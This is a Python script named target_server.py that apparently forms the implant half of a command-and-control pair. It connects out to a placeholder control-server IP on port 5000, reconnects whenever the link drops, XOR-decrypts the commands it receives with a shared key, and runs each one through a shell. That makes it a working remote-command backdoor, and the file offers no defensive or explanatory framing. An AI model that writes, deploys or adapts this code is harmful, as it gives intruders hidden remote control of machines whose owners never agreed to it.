# target_server.py

import socket
import threading
import time
import subprocess

# Replace this with the same shared secret key (passphrase) used in the control server
SECRET_KEY = b'your_shared_secret_key'

def connect_to_control_server():
    control_server_host = 'your_control_server_ip'
    control_server_port = 5000

    while True:
        try:
            target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_socket.connect((control_server_host, control_server_port))
            return target_socket
        except Exception as e:
            print(f"Connection to Control Server failed. Retrying in 5 seconds...")
            time.sleep(5)

def xor_encrypt_decrypt(data):
    # Perform XOR encryption/decryption with the shared secret key
    return bytes([data[i] ^ SECRET_KEY[i % len(SECRET_KEY)] for i in range(len(data))])

def handle_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        print(result)
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e.output}")

def handle_control_connection():
    global control_socket
    while True:
        try:
            encrypted_data = control_socket.recv(1024)
            if not encrypted_data:
                # Control server disconnected
                print("Control Server disconnected. Reconnecting...")
                control_socket.close()
                control_socket = connect_to_control_server()
            else:
                # Decrypt the received command
                decrypted_data = xor_encrypt_decrypt(encrypted_data)
                command = decrypted_data.decode()
                print(f"Received from Control Server: {command}")

                # Execute the command in a new thread
                threading.Thread(target=handle_command, args=(command,), daemon=True).start()

        except ConnectionResetError:
            # Control server forcibly closed the connection
            print("Connection to Control Server forcibly closed. Reconnecting...")
            control_socket.close()
            control_socket = connect_to_control_server()

if __name__ == '__main__':
    control_socket = connect_to_control_server()

    threading.Thread(target=handle_control_connection, daemon=True).start()

    try:
        while True:
            # Keep the target server running
            pass

    except KeyboardInterrupt:
        control_socket.close()
